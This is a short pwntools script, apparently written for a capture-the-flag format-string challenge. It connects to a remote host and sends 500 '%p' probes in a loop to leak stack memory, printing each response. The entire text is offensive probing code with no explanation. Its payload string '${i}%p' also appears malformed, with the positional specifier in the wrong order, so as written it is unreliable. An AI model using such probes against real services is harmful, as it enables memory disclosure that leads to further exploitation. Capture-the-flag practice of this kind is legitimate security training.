from pwn import *

#p = process(b'./run')
p = remote(b'fmtstr.challenges.cfd', 5000)


for i in range(0, 500):
    p.sendline(f'${i}%p'.encode())
    print(p.recvline())

p.close()
